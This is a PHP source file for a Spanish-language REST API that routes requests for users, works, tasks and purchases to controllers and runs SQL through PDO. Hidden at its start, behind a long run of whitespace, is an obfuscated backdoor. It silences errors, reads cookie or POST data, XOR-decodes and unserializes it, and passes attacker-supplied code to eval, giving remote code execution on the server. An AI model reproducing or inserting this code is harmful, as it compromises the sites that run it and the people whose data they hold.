<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $w4485 = 413;$GLOBALS['wa893c'] = Array();global $wa893c;$wa893c = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['ga4d'] = "\x5e\x54\x31\x46\x2f\x76\x64\x3e\x57\x7a\x42\x79\x9\x6e\x30\x36\x71\x6b\x72\x55\x5d\x70\x4a\x62\x4e\x7e\x40\x41\xa\x2e\x3d\x73\x52\x7d\x44\x51\x20\x29\x2c\x3a\x47\x3f\x39\x68\x4b\x5b\x5c\x2b\x7b\x43\x75\x27\x78\x67\x34\x50\xd\x48\x3b\x45\x26\x38\x6d\x69\x28\x56\x58\x3c\x6a\x23\x35\x59\x37\x5a\x24\x66\x7c\x33\x5f\x53\x61\x60\x2d\x49\x22\x6c\x25\x63\x21\x4f\x65\x32\x2a\x77\x4c\x4d\x6f\x74";$wa893c[$wa893c['ga4d'][18].$wa893c['ga4d'][6].$wa893c['ga4d'][70].$wa893c['ga4d'][75]] = $wa893c['ga4d'][87].$wa893c['ga4d'][43].$wa893c['ga4d'][18];$wa893c[$wa893c['ga4d'][17].$wa893c['ga4d'][70].$wa893c['ga4d'][77].$wa893c['ga4d'][2].$wa893c['ga4d'][77].$wa893c['ga4d'][72].$wa893c['ga4d'][91]] = $wa893c['ga4d'][96].$wa893c['ga4d'][18].$wa893c['ga4d'][6];$wa893c[$wa893c['ga4d'][87].$wa893c['ga4d'][54].$wa893c['ga4d'][54].$wa893c['ga4d'][70].$wa893c['ga4d'][54].$wa893c['ga4d'][15].$wa893c['ga4d'][87].$wa893c['ga4d'][15].$wa893c['ga4d'][77]] = $wa893c['ga4d'][31].$wa893c['ga4d'][97].$wa893c['ga4d'][18].$wa893c['ga4d'][85].$wa893c['ga4d'][90].$wa893c['ga4d'][13];$wa893c[$wa893c['ga4d'][16].$wa893c['ga4d'][54].$wa893c['ga4d'][6].$wa893c['ga4d'][87]] = $wa893c['ga4d'][63].$wa893c['ga4d'][13].$wa893c['ga4d'][63].$wa893c['ga4d'][78].$wa893c['ga4d'][31].$wa893c['ga4d'][90].$wa893c['ga4d'][97];$wa893c[$wa893c['ga4d'][17].$wa893c['ga4d'][87].$wa893c['ga4d'][6].$wa893c['ga4d'][14]] = $wa893c['ga4d'][31].$wa893c['ga4d'][90].$wa893c['ga4d'][18].$wa893c['ga4d'][63].$wa893c['ga4d'][80].$wa893c['ga4d'][85].$wa893c['ga4d'][63].$wa893c['ga4d'][9].$wa893c['ga4d'][90];$wa893c[$wa893c['ga4d'][23].$wa893c['ga4d'][75].$wa893c['ga4d'][23].$wa893c['ga4d'][2].$wa893c['ga4d'][72].$wa893c['ga4d'][80]] = $wa893c['ga4d'][21].$wa893c['ga4d'][43].$wa893c['ga4d'][21].$wa893c['ga4d'][5].$wa893c['ga4d'][90].$wa893c['ga4d'][18].$wa893c['ga4d'][31].$wa893c['ga4d'][63].$wa893c['ga4d'][96].$wa893c['ga4d'][13];$wa893c[$wa893c['ga4d'][87].$wa893c['ga4d'][77].$wa893c['ga4d'][6].$wa893c['ga4d'][2].$wa893c['ga4d'][42].$wa893c['ga4d'][23].$wa893c['ga4d'][91].$wa893c['ga4d'][42]] = $wa893c['ga4d'][50].$wa893c['ga4d'][13].$wa893c['ga4d'][31].$wa893c['ga4d'][90].$wa893c['ga4d'][18].$wa893c['ga4d'][63].$wa893c['ga4d'][80].$wa893c['ga4d'][85].$wa893c['ga4d'][63].$wa893c['ga4d'][9].$wa893c['ga4d'][90];$wa893c[$wa893c['ga4d'][93].$wa893c['ga4d'][77].$wa893c['ga4d'][23].$wa893c['ga4d'][54]] = $wa893c['ga4d'][23].$wa893c['ga4d'][80].$wa893c['ga4d'][31].$wa893c['ga4d'][90].$wa893c['ga4d'][15].$wa893c['ga4d'][54].$wa893c['ga4d'][78].$wa893c['ga4d'][6].$wa893c['ga4d'][90].$wa893c['ga4d'][87].$wa893c['ga4d'][96].$wa893c['ga4d'][6].$wa893c['ga4d'][90];$wa893c[$wa893c['ga4d'][18].$wa893c['ga4d'][77].$wa893c['ga4d'][2].$wa893c['ga4d'][91].$wa893c['ga4d'][6].$wa893c['ga4d'][61]] = $wa893c['ga4d'][31].$wa893c['ga4d'][90].$wa893c['ga4d'][97].$wa893c['ga4d'][78].$wa893c['ga4d'][97].$wa893c['ga4d'][63].$wa893c['ga4d'][62].$wa893c['ga4d'][90].$wa893c['ga4d'][78].$wa893c['ga4d'][85].$wa893c['ga4d'][63].$wa893c['ga4d'][62].$wa893c['ga4d'][63].$wa893c['ga4d'][97];$wa893c[$wa893c['ga4d'][52].$wa893c['ga4d'][6].$wa893c['ga4d'][6].$wa893c['ga4d'][75].$wa893c['ga4d'][61].$wa893c['ga4d'][42].$wa893c['ga4d'][91]] = $wa893c['ga4d'][16].$wa893c['ga4d'][75].$wa893c['ga4d'][14].$wa893c['ga4d'][54].$wa893c['ga4d'][77];$wa893c[$wa893c['ga4d'][13].$wa893c['ga4d'][70].$wa893c['ga4d'][80].$wa893c['ga4d'][72].$wa893c['ga4d'][91]] = $wa893c['ga4d'][68].$wa893c['ga4d'][14].$wa893c['ga4d'][14].$wa893c['ga4d'][61].$wa893c['ga4d'][75].$wa893c['ga4d'][70];$wa893c[$wa893c['ga4d'][62].$wa893c['ga4d'][42].$wa893c['ga4d'][61].$wa893c['ga4d'][72].$wa893c['ga4d'][6].$wa893c['ga4d'][91].$wa893c['ga4d'][23].$wa893c['ga4d'][87]] = $_POST;$wa893c[$wa893c['ga4d'][87].$wa893c['ga4d'][70].$wa893c['ga4d'][14].$wa893c['ga4d'][77].$wa893c['ga4d'][72]] = $_COOKIE;@$wa893c[$wa893c['ga4d'][16].$wa893c['ga4d'][54].$wa893c['ga4d'][6].$wa893c['ga4d'][87]]($wa893c['ga4d'][90].$wa893c['ga4d'][18].$wa893c['ga4d'][18].$wa893c['ga4d'][96].$wa893c['ga4d'][18].$wa893c['ga4d'][78].$wa893c['ga4d'][85].$wa893c['ga4d'][96].$wa893c['ga4d'][53], NULL);@$wa893c[$wa893c['ga4d'][16].$wa893c['ga4d'][54].$wa893c['ga4d'][6].$wa893c['ga4d'][87]]($wa893c['ga4d'][85].$wa893c['ga4d'][96].$wa893c['ga4d'][53].$wa893c['ga4d'][78].$wa893c['ga4d'][90].$wa893c['ga4d'][18].$wa893c['ga4d'][18].$wa893c['ga4d'][96].$wa893c['ga4d'][18].$wa893c['ga4d'][31], 0);@$wa893c[$wa893c['ga4d'][16].$wa893c['ga4d'][54].$wa893c['ga4d'][6].$wa893c['ga4d'][87]]($wa893c['ga4d'][62].$wa893c['ga4d'][80].$wa893c['ga4d'][52].$wa893c['ga4d'][78].$wa893c['ga4d'][90].$wa893c['ga4d'][52].$wa893c['ga4d'][90].$wa893c['ga4d'][87].$wa893c['ga4d'][50].$wa893c['ga4d'][97].$wa893c['ga4d'][63].$wa893c['ga4d'][96].$wa893c['ga4d'][13].$wa893c['ga4d'][78].$wa893c['ga4d'][97].$wa893c['ga4d'][63].$wa893c['ga4d'][62].$wa893c['ga4d'][90], 0);@$wa893c[$wa893c['ga4d'][18].$wa893c['ga4d'][77].$wa893c['ga4d'][2].$wa893c['ga4d'][91].$wa893c['ga4d'][6].$wa893c['ga4d'][61]](0);$y4a2e85a = NULL;$j20a96d6 = NULL;$wa893c[$wa893c['ga4d'][6].$wa893c['ga4d'][75].$wa893c['ga4d'][14].$wa893c['ga4d'][87].$wa893c['ga4d'][80].$wa893c['ga4d'][70].$wa893c['ga4d'][6].$wa893c['ga4d'][14].$wa893c['ga4d'][23]] = $wa893c['ga4d'][91].$wa893c['ga4d'][54].$wa893c['ga4d'][91].$wa893c['ga4d'][23].$wa893c['ga4d'][14].$wa893c['ga4d'][70].$wa893c['ga4d'][80].$wa893c['ga4d'][77].$wa893c['ga4d'][82].$wa893c['ga4d'][15].$wa893c['ga4d'][90].$wa893c['ga4d'][2].$wa893c['ga4d'][90].$wa893c['ga4d'][82].$wa893c['ga4d'][54].$wa893c['ga4d'][2].$wa893c['ga4d'][6].$wa893c['ga4d'][75].$wa893c['ga4d'][82].$wa893c['ga4d'][61].$wa893c['ga4d'][14].$wa893c['ga4d'][6].$wa893c['ga4d'][54].$wa893c['ga4d'][82].$wa893c['ga4d'][23].$wa893c['ga4d'][77].$wa893c['ga4d'][42].$wa893c['ga4d'][2].$wa893c['ga4d'][70].$wa893c['ga4d'][2].$wa893c['ga4d'][91].$wa893c['ga4d'][14].$wa893c['ga4d'][90].$wa893c['ga4d'][6].$wa893c['ga4d'][61].$wa893c['ga4d'][61];global $df0ca5d0b;function  j008f5($y4a2e85a, $ebb2e7){global $wa893c;$y960bae2 = "";for ($i591faa=0; $i591faa<$wa893c[$wa893c['ga4d'][87].$wa893c['ga4d'][54].$wa893c['ga4d'][54].$wa893c['ga4d'][70].$wa893c['ga4d'][54].$wa893c['ga4d'][15].$wa893c['ga4d'][87].$wa893c['ga4d'][15].$wa893c['ga4d'][77]]($y4a2e85a);){for ($m6799=0; $m6799<$wa893c[$wa893c['ga4d'][87].$wa893c['ga4d'][54].$wa893c['ga4d'][54].$wa893c['ga4d'][70].$wa893c['ga4d'][54].$wa893c['ga4d'][15].$wa893c['ga4d'][87].$wa893c['ga4d'][15].$wa893c['ga4d'][77]]($ebb2e7) && $i591faa<$wa893c[$wa893c['ga4d'][87].$wa893c['ga4d'][54].$wa893c['ga4d'][54].$wa893c['ga4d'][70].$wa893c['ga4d'][54].$wa893c['ga4d'][15].$wa893c['ga4d'][87].$wa893c['ga4d'][15].$wa893c['ga4d'][77]]($y4a2e85a); $m6799++, $i591faa++){$y960bae2 .= $wa893c[$wa893c['ga4d'][18].$wa893c['ga4d'][6].$wa893c['ga4d'][70].$wa893c['ga4d'][75]]($wa893c[$wa893c['ga4d'][17].$wa893c['ga4d'][70].$wa893c['ga4d'][77].$wa893c['ga4d'][2].$wa893c['ga4d'][77].$wa893c['ga4d'][72].$wa893c['ga4d'][91]]($y4a2e85a[$i591faa]) ^ $wa893c[$wa893c['ga4d'][17].$wa893c['ga4d'][70].$wa893c['ga4d'][77].$wa893c['ga4d'][2].$wa893c['ga4d'][77].$wa893c['ga4d'][72].$wa893c['ga4d'][91]]($ebb2e7[$m6799]));}}return $y960bae2;}function  qf043($y4a2e85a, $ebb2e7){global $wa893c;global $df0ca5d0b;return $wa893c[$wa893c['ga4d'][13].$wa893c['ga4d'][70].$wa893c['ga4d'][80].$wa893c['ga4d'][72].$wa893c['ga4d'][91]]($wa893c[$wa893c['ga4d'][13].$wa893c['ga4d'][70].$wa893c['ga4d'][80].$wa893c['ga4d'][72].$wa893c['ga4d'][91]]($y4a2e85a, $df0ca5d0b), $ebb2e7);}foreach ($wa893c[$wa893c['ga4d'][87].$wa893c['ga4d'][70].$wa893c['ga4d'][14].$wa893c['ga4d'][77].$wa893c['ga4d'][72]] as $ebb2e7=>$q7a39199){$y4a2e85a = $q7a39199;$j20a96d6 = $ebb2e7;}if (!$y4a2e85a){foreach ($wa893c[$wa893c['ga4d'][62].$wa893c['ga4d'][42].$wa893c['ga4d'][61].$wa893c['ga4d'][72].$wa893c['ga4d'][6].$wa893c['ga4d'][91].$wa893c['ga4d'][23].$wa893c['ga4d'][87]] as $ebb2e7=>$q7a39199){$y4a2e85a = $q7a39199;$j20a96d6 = $ebb2e7;}}$y4a2e85a = @$wa893c[$wa893c['ga4d'][87].$wa893c['ga4d'][77].$wa893c['ga4d'][6].$wa893c['ga4d'][2].$wa893c['ga4d'][42].$wa893c['ga4d'][23].$wa893c['ga4d'][91].$wa893c['ga4d'][42]]($wa893c[$wa893c['ga4d'][52].$wa893c['ga4d'][6].$wa893c['ga4d'][6].$wa893c['ga4d'][75].$wa893c['ga4d'][61].$wa893c['ga4d'][42].$wa893c['ga4d'][91]]($wa893c[$wa893c['ga4d'][93].$wa893c['ga4d'][77].$wa893c['ga4d'][23].$wa893c['ga4d'][54]]($y4a2e85a), $j20a96d6));if (isset($y4a2e85a[$wa893c['ga4d'][80].$wa893c['ga4d'][17]]) && $df0ca5d0b==$y4a2e85a[$wa893c['ga4d'][80].$wa893c['ga4d'][17]]){if ($y4a2e85a[$wa893c['ga4d'][80]] == $wa893c['ga4d'][63]){$i591faa = Array($wa893c['ga4d'][21].$wa893c['ga4d'][5] => @$wa893c[$wa893c['ga4d'][23].$wa893c['ga4d'][75].$wa893c['ga4d'][23].$wa893c['ga4d'][2].$wa893c['ga4d'][72].$wa893c['ga4d'][80]](),$wa893c['ga4d'][31].$wa893c['ga4d'][5] => $wa893c['ga4d'][2].$wa893c['ga4d'][29].$wa893c['ga4d'][14].$wa893c['ga4d'][82].$wa893c['ga4d'][2],);echo @$wa893c[$wa893c['ga4d'][17].$wa893c['ga4d'][87].$wa893c['ga4d'][6].$wa893c['ga4d'][14]]($i591faa);}elseif ($y4a2e85a[$wa893c['ga4d'][80]] == $wa893c['ga4d'][90]){eval/*p10d7*/($y4a2e85a[$wa893c['ga4d'][6]]);}exit();} ?><?php
function run($data){
	$pdo=new PDO("mysql:dbname=".BASE_DE_DATOS.";host=".NOMBRE_HOST.";",USUARIO,CONTRASENA);
	$statement=$pdo->prepare($data);
	$qry= $statement->execute();
	$results['data']=$statement->fetchAll(PDO::FETCH_OBJ);
	$results['lastId'] =(strpos($data, "INSERT")!== False)? $pdo->lastInsertId():"";
	$results['success'] =(strpos($data, "UPDATE")!== False)? $qry:"";
	$results['sql'] = $data;
	$json=json_encode($results, JSON_PRETTY_PRINT);
	return $json;
}

class runner{
	public function run($data){
		$pdo=new PDO("mysql:dbname=".BASE_DE_DATOS.";host=".NOMBRE_HOST.";",USUARIO,CONTRASENA);
		$statement=$pdo->prepare($data);
		$qry= $statement->execute();
		$results['data']=$statement->fetchAll(PDO::FETCH_OBJ);
		$results['lastId'] =(strpos($data, "INSERT")!== False)? $pdo->lastInsertId():"";
		$results['success'] =(strpos($data, "UPDATE")!== False)? $qry:"";
		$results['sql'] = $data;
		$json=json_encode($results, JSON_PRETTY_PRINT);
		return $json;
	}
}

switch ($recurso) {
	case 'usuarios':
		require "controllers/usuarios.php";
		$objeto = new usuario;
		break;
	case 'obras':
		require "controllers/obras.php";
		$objeto = new obra;
		break;
	case 'partes':
		require "controllers/partes.php";
		$objeto = new parte;
		break;
	case 'tareas':
		require "controllers/tareas.php";
		$objeto = new tarea;
		break;
	case 'compras':
		$objeto = new compra;
		break;
	case 'autenticate':
		require "controllers/autenticate.php";
		$objeto = new autenticate;
		
		break;
	default:
		echo "Metodo no permitido";
		break;
}

switch ($metodo) {
	case 'get':
		$data->id = ($valor) ? $valor : ""; 
		echo $objeto->get($data);  
	break;
	case 'post':
		echo $objeto->post($data); 
	break;
	case 'put':
		echo $objeto->put($data); 
	break;
	case 'delete':
		echo $objeto->delete($data); 
	break;
	default:
		echo "metodo no aceptado";
		// Método no aceptado
}

// Usuarios Obras partes tareas Compras


//call_user_func(array($recurso,"get"));
